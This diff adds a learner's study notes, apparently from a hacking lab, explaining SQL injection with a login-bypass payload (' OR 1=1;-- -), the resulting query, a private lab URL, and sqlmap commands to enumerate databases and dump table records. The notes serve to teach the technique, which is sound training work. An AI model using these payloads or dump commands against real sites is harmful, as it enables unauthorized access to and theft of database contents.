@@ -1,0 +1,35 @@
+SQL is a common programming language that a web server uses to communicate with a database.
+We as an attacker would like to access the database aswell...
+So, we will explore SQL injection unsing sqlmap
+
+SQL injection
+ - let's imagine a username and password website
+
+ - when you enter your credentials, a query like this is sent to the database:
+   SELECT * FROM users WHERE username = 'USERNAME' AND password = 'PASSWORD';
+ 
+ - let's also imagine that they know nothing about security...
+ 
+ - we can try to bypass the login by entering a username and password like this:
+    1) username: admin
+       password: abc' OR 1=1;-- -
+    2) the query sent to the database would look like this:
+       SELECT * FROM users WHERE username = 'admin' AND password = 'abc' OR 1=1;-- -';
+ 
+'http://10.114.162.167/ai/includes/user_login?email=admin&password=password'
+
+ - if we think about it, the password will always hold true because of the OR 1=1 statement. 
+ - the -- - is a comment, so the rest of the query is ignored.
+ - the ' after abc is to take only abc as the password (we could also omit abc and just use ' OR 1=1;-- -)
+
+
+Automating SQL injection
+ - SQLmap = automated tool for detecting & exploiting SQL injection in web apps
+ - sqlmap --wizard = interactive mode, guides you through the process (--help for more options)
+
+ -> --dbs = enumerate database names
+ -> sqlmap -u URL -D database_name --tables = enumerate tables in a specific database
+ -> sqlmap -u URL -D database_name -T table_name --dump = enumerate records in a table
+
+ -> if you see a URL that has a GET parameter (eg. ?id=1), you can use sqlmap -u to test for SQL injection
+    - sqlmap -u "http://example.com/page.php?id=1" --dbs
